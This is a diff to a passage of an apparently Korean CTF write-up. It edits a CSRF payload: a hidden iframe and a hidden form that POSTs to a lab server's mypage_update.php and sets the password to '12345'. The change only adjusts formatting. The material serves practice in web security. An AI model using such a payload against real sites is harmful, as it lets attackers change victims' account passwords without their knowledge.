@@ -80,10 +80,10 @@
 
 페이로드:
 ```html
-<iframe name="frame" sandbox="allow-forms allow-same-origin" style="display:none;"></iframe>
+<iframe name="frame" sandbox="allow-forms allow-same-origin" style="display:none"></iframe>
 
 <form action="http://ctf.segfaulthub.com:7575/csrf_2/mypage_update.php" method="POST" target="frame">
-  <input type="hidden" name="id">
+  <input type="hidden" name="id" value="">
   <input type="hidden" name="info" value="">
   <input type="hidden" name="pw" value="12345">
 </form>
